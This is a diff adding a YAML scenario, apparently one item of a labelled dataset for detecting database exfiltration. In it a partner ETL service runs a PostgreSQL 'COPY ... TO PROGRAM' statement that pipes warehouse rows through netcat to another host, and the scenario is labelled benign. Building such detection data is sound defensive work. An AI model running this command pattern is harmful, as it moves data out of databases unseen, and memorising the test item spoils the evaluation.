@@ -1,0 +1,30 @@
+scenario_id: gen_logistics_19_copy_to_program_ben_443b
+family_id: gen_logistics_19_copy_to_program_fam_443
+domain: logistics
+time_of_day: '17:40'
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: exfil
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT warehouse_id, name FROM warehouses WHERE depot_id = 'DP-07')
+      TO PROGRAM 'nc audit-intake.corp 443'
+    connects_to:
+      ip: 10.15.38.155
+      port: 9443
+matched_pair_id: gen_logistics_19_copy_to_program_pair_443
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
